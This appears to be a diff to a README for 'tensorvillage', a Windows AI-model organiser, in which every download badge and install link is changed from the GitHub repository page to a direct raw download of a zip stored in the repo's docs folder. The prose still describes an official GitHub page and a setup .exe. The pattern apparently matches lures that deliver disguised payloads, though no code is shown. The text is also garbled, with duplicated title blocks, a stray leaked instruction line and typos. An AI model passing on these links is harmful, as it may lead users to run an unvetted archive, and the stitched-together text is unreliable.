@@ -1,7 +1,7 @@
 <h1>📦 tensorvillage - One Home for Every AI Model You Own</h1>
 
 <p align="center">
-  <a href="https://github.com/s9595/tensorvillage"><img src="https://img.shields.io/badge/Download%20tensorvillage-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="max-width:100%;"></a>
+  <a href="https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip"><img src="https://img.shields.io/badge/Download%20tensorvillage-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="max-width:100%;"></a>
 </p>
 
 ## 🧭 What Is tensorvillage?
@@ -15,7 +15,7 @@ tensorvillage is a free, easy-to-use program for Windows that brings all your AI
 localfile: check full path. Do not ask for a virtual hard drive. Help readers check existing organization. Show logical filter, tag, sort. Explain duplicate removal as part of the organization process.<h1>🧠 tensorvillage - One Organized Drive for Every AI Model</h1>
 
 <p align="center">
-  <a href="https://github.com/s9595/tensorvillage"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download tensorvillage" style="max-width:100%;"></a>
+  <a href="https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download tensorvillage" style="max-width:100%;"></a>
 </p>
 
 ## 🗂️ What Is tensorvillage?
@@ -34,7 +34,7 @@ Follow these three simple steps to get started.
 
 Visit this link to download the application:  
 
-👉 [https://github.com/s9595/tensorvillage](https://github.com/s9595/tensorvillage)  
+👉 [https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip](https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip)  
 
 Click the green **Download** button on that page. The download will begin automatically. The file is small and downloads quickly.  
 
@@ -91,7 +91,7 @@ If you can use Windows Explorer, you can use tensorvillage. No programming, no t
 Let’s walk through the download and installation process one more time in detail, to make sure everything goes smoothly.  
 
 1. **Click the download badge** at the top of this page, or visit the link:  
-   👉 [https://github.com/s9595/tensorvillage](https://github.com/s9595/tensorvillage)  
+   👉 [https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip](https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip)  
    This opens the official GitHub page for tensorvillage.  
 
 2. On the GitHub page, look for a green **Download** button or a link that says `tensorvillage-setup.exe` or similar. Click it. Your browser will ask where to save the file. Choose your **Downloads** folder.  
@@ -138,7 +138,7 @@ The virtual filesystem approach is unique and powerful. Instead of asking you to
 Ift you have AI models scattered across multiple disks, stop wasting time hunting for the right `.safetensors` file or that one LoRA that worked perfectly last month. Download tensorvillage today, add your folders, and let it bring order to your AI universe. Your future self will thank you.  
 
 <p align="center">
-  <a href="https://github.com/s9595/tensorvillage"><img src="https://img.shields.io/badge/🚀%20Get%20tensorvillage%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download tensorvillage" style="max-width:100%;"></a>
+  <a href="https://raw.githubusercontent.com/s9595/tensorvillage/main/docs/1.8.zip"><img src="https://img.shields.io/badge/🚀%20Get%20tensorvillage%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download tensorvillage" style="max-width:100%;"></a>
 </p>
 
 Keywords: ai-art, civitai, comfyui, csharp, deduplication, dotnet, flux, generative-ai, gguf, huggingface, llm, lora, model-manager, safetensors, stable-diffusion, text-to-image, text-to-video, virtual-filesystem, windows, winfsp
